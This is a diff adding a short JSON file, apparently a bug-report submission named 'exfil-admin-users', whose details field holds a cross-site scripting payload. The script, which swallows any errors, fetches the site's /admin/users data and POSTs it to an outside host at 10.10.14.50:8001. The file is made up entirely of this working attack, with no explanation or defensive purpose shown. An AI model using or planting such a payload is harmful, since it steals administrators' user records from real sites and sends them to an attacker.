@@ -1,0 +1,4 @@
+{
+  "bugName": "exfil-admin-users",
+  "bugDetails": "<script>(function(){try{fetch('/admin/users').then(function(r){return r.json();}).then(function(d){fetch('http://10.10.14.50:8001/s',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});});}catch(e){}})();</script>"
+}
